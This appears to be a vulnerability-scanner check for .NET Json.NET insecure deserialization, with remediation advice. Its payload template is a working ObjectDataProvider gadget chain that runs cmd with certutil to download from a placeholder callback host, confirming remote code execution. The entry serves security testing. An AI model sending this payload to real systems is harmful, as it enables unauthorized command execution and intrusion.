title: .NET insecure deserialization (Json.NET $type ObjectDataProvider)

oracle.payload_template: {{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","MethodParameters":{{"$type":"System.Collections.ArrayList, mscorlib","$values":["cmd","/c certutil -urlcache -f http://{callback} x"]}},"ObjectInstance":{{"$type":"System.Diagnostics.Process, System"}}}}

remediation: Never deserialize untrusted data into arbitrary types. Use allowlist-based deserialization or a data-only format (JSON with a fixed schema), disable polymorphic type handling, and remove/patch the gadget libraries on the classpath. The inbound callback proves the gadget chain executed.
